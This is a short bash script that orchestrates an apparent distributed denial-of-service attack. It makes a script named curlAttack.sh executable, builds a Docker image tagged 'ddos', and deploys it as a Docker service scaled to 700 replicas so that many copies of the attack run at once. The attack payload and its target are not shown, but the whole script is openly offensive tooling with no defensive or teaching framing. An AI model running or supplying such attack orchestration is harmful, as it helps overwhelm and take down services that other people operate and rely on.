#!/bin/bash
chmod +x curlAttack.sh
docker build -t ddos .

docker service create --name ddos-serv --detach=false ddos

docker service ls
docker service scale ddos-serv=700

docker service ls
